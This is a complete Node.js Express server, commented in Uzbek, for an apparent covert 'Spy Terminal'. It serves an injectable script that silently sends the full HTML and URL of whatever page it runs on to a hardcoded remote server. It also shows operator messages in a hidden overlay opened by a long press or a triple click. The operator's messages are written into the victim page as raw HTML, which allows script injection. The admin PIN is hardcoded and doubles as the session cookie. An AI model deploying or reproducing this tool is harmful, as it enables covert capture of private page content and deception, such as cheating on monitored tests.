const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const cookieParser = require("cookie-parser");

const app = express();

// ========================================================
// ⚙️ SOZLAMALAR
// 1. Renderdagi sayt manzilingiz (oxirida / bo'lmasin):
const MY_SERVER_URL = "https://server-xkuu.onrender.com"; 
// 2. Admin Panel Paroli:
const ADMIN_PASSWORD = "8908";
// ========================================================

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(cookieParser());

// --- XOTIRA ---
let capturedData = { url: "", html: "", date: null };
// Xabarlar tarixi (Endi bu shunchaki satr emas)
let chatHistory = ""; 
let lastUpdateID = 0; // Xabar o'zgarganini bilish uchun ID

// --- AUTH (HIMOYA) ---
const checkAuth = (req, res, next) => {
    if (req.cookies.admin_token === ADMIN_PASSWORD) {
        next();
    } else {
        res.redirect("/login");
    }
};

// ========================================================
// 📜 CLIENT SKRIPTI (f1.js) - Scroll va Tarix bilan
// ========================================================
const clientScript = `
(function(){
  const BASE = '${MY_SERVER_URL}'; 
  let holdTimer=null, clickCount=0, lastSince=0, box=null;

  function makeBox(){
    if(box) return box;
    box=document.createElement('div');
    Object.assign(box.style,{
      position:'fixed', left:'15px', bottom:'15px', 
      width:'300px',              // Aniq eni
      maxHeight:'400px',          // Maksimal balandlik (undan oshsa scroll bo'ladi)
      overflow:'auto',            // SCROLL (o'nga va pastga)
      background:'rgba(0, 0, 0, 0.9)', color:'#0f0', padding:'15px',
      font:'14px "Courier New", monospace', borderRadius:'12px',
      boxShadow:'0 8px 32px rgba(0, 255, 0, 0.2)', zIndex:2147483647,
      display:'none', 
      whiteSpace:'pre-wrap',      // Matnni keyingi qatorga tushirish
      wordWrap: 'break-word',     // Uzun so'zlarni sindirish
      backdropFilter:'blur(10px)',
      border:'1px solid #00ff00'
    });
    
    // Scroll dizayni (Webkit brauzerlar uchun)
    const style = document.createElement('style');
    style.innerHTML = \`
      ::-webkit-scrollbar { width: 8px; height: 8px; }
      ::-webkit-scrollbar-track { background: #111; }
      ::-webkit-scrollbar-thumb { background: #00ff00; borderRadius: 4px; }
    \`;
    document.head.appendChild(style);

    document.body.appendChild(box);
    return box;
  }

  function showToast(msg, type='info'){
    const t=document.createElement('div');
    t.textContent=msg;
    const color = type==='error'?'#ff4444':'#00ccff';
    Object.assign(t.style,{
      position:'fixed', left:'50%', bottom:'20px', transform:'translateX(-50%)',
      background:'rgba(20,20,20,0.9)', color:color, padding:'10px 20px',
      borderRadius:'30px', font:'14px sans-serif', zIndex:2147483646,
      boxShadow:'0 5px 15px rgba(0,0,0,0.5)', border: '1px solid '+color
    });
    document.body.appendChild(t);
    setTimeout(()=>t.remove(), 3000);
  }

  async function sendPage(){
    try{
      await fetch(BASE+'/upload-html',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({
            html: document.documentElement.outerHTML,
            url: window.location.href
        })
      });
      showToast("✅ Aloqa o'rnatildi!");
    }catch(e){}
  }

  async function fetchLatest(){
    try{
      const r=await fetch(BASE+'/latest?since='+lastSince);
      const j=await r.json();
      
      // Agar yangi ID kelsa (demak xabar o'zgargan)
      if(j.success && j.timestamp > lastSince){
        const b=makeBox();
        // Serverdan kelgan HTML formatdagi xabarni qo'yamiz
        b.innerHTML = "<div style='border-bottom:1px solid #333; padding-bottom:5px; margin-bottom:10px; color:#fff'>COMMAND LINE:</div>" + j.message;
        b.style.display='block';
        
        // Avtomatik eng pastga tushirish (scroll down)
        b.scrollTop = b.scrollHeight;
        
        lastSince = j.timestamp;
        showToast("📩 Yangi xabar!");
      }
    }catch(e){}
  }

  document.addEventListener('mousedown', e=>{
    if(e.button===0) holdTimer=setTimeout(fetchLatest,3000);
  });
  document.addEventListener('mouseup', ()=>{
    if(holdTimer){clearTimeout(holdTimer); holdTimer=null;}
  });

  document.addEventListener('click', e=>{
    if(e.button===0){
      clickCount++;
      setTimeout(()=>clickCount=0,600);
      if(clickCount>=3){
        clickCount=0;
        if(box) box.style.display=(box.style.display==='none')?'block':'none';
      }
    }
  });

  sendPage();
})();
`;

// ========================================================
// 🛣 SERVER YO'LLARI
// ========================================================

app.get("/f1.js", (req, res) => {
    res.setHeader("Content-Type", "application/javascript");
    res.send(clientScript);
});

// LOGIN SAHIFASI
app.get("/login", (req, res) => {
    if (req.cookies.admin_token === ADMIN_PASSWORD) return res.redirect("/");
    res.send(`
        <body style="background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:monospace">
        <form action="/login" method="POST" style="border:1px solid #0f0;padding:20px;text-align:center">
            <h1>🔒 ACCESS DENIED</h1>
            <input type="password" name="password" placeholder="PIN CODE" style="background:#000;border:1px solid #0f0;color:#fff;padding:10px;text-align:center">
            <button style="background:#0f0;color:#000;border:none;padding:10px;cursor:pointer">ENTER</button>
        </form>
        </body>
    `);
});

app.post("/login", (req, res) => {
    if (req.body.password === ADMIN_PASSWORD) {
        res.cookie("admin_token", ADMIN_PASSWORD, { maxAge: 86400000, httpOnly: true });
        res.redirect("/");
    } else {
        res.redirect("/login");
    }
});

app.get("/logout", (req, res) => {
    res.clearCookie("admin_token");
    res.redirect("/login");
});

// ADMIN PANEL
app.get("/", checkAuth, (req, res) => {
    const hasData = capturedData.html.length > 0;
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>🕵️ Spy Terminal</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { background: #0d1117; color: #c9d1d9; font-family: 'Courier New', monospace; padding: 20px; max-width: 800px; margin: auto; }
                .box { border: 1px solid #30363d; background: #161b22; padding: 15px; margin-bottom: 20px; border-radius: 6px; }
                h2 { margin-top: 0; color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
                input { width: 70%; padding: 10px; background: #0d1117; border: 1px solid #30363d; color: #fff; }
                button { padding: 10px 20px; cursor: pointer; border: none; font-weight: bold; }
                .btn-send { background: #238636; color: white; width: 25%; }
                .btn-clear { background: #da3633; color: white; width: 100%; margin-top: 5px; }
                .history { background: #000; color: #0f0; padding: 10px; height: 150px; overflow-y: scroll; border: 1px solid #333; font-size: 12px; white-space: pre-wrap; }
                a { color: #58a6ff; }
            </style>
        </head>
        <body>
            <h1>🕵️ COMMAND CENTER</h1>
            
            <div class="box">
                <h2>💬 Xabar Yuborish (Chat)</h2>
                <form action="/set-message" method="POST" style="display:flex; justify-content:space-between">
                    <input type="text" name="msg" placeholder="Xabar yozing..." autocomplete="off" autofocus>
                    <button class="btn-send">YUBORISH</button>
                </form>
                
                <p>Chat Tarixi (Clientda shunday ko'rinadi):</p>
                <!-- Tarixni ko'rsatish -->
                <div class="history">${chatHistory || "Hali xabar yo'q..."}</div>
                
                <form action="/clear-history" method="POST">
                    <button class="btn-clear">🗑 TARIXNI TOZALASH</button>
                </form>
            </div>

            <div class="box">
                <h2>📥 Ma'lumot</h2>
                <p>URL: <a href="${capturedData.url}" target="_blank">${capturedData.url || "---"}</a></p>
                ${hasData ? `<a href="/view-site" target="_blank" style="background:#1f6feb;color:white;padding:5px 10px;text-decoration:none;display:block;text-align:center">👁 SAYTNI OCHISH</a>` : ''}
            </div>
            
            <p style="font-size:12px;color:#666">Server: ${MY_SERVER_URL}</p>
            <a href="/logout" style="color:red">Chiqish</a>
        </body>
        </html>
    `);
});

// SAYTNI OCHISH
app.get("/view-site", checkAuth, (req, res) => {
    if (!capturedData.html) return res.send("Ma'lumot yo'q");
    const fixedHtml = capturedData.html.replace("<head>", `<head><base href="${capturedData.url}">`);
    res.send(fixedHtml);
});

// DATA QABUL QILISH
app.post("/upload-html", (req, res) => {
    capturedData.url = req.body.url || "Noma'lum";
    capturedData.html = req.body.html || "";
    capturedData.date = Date.now();
    res.json({ status: "success" });
});

// XABARNI TARIXGA QO'SHISH (Update)
app.post("/set-message", checkAuth, (req, res) => {
    const msg = req.body.msg;
    if(msg) {
        const time = new Date().toLocaleTimeString('uz-UZ', {hour: '2-digit', minute:'2-digit'});
        // Eskisini o'chirmaymiz, yangisini qo'shamiz (<br> bilan)
        chatHistory += `[${time}] ${msg}\n`;
        
        lastUpdateID = Date.now(); // Yangilangani bildirish
    }
    res.redirect("/");
});

// TARIXNI TOZALASH
app.post("/clear-history", checkAuth, (req, res) => {
    chatHistory = ""; // Tozalash
    lastUpdateID = Date.now(); // Clientga tozalanganini bildirish
    res.redirect("/");
});

// CLIENTGA JAVOB
app.get("/latest", (req, res) => {
    const clientTimestamp = parseInt(req.query.since) || 0;
    
    // Agar serverdagi ID clientnikidan katta bo'lsa, yangi ma'lumot bor
    if (lastUpdateID > clientTimestamp) {
        res.json({ 
            success: true, 
            message: chatHistory, // To'liq tarixni yuboramiz
            timestamp: lastUpdateID 
        });
    } else {
        res.json({ success: false });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server ishga tushdi: ${PORT}`));
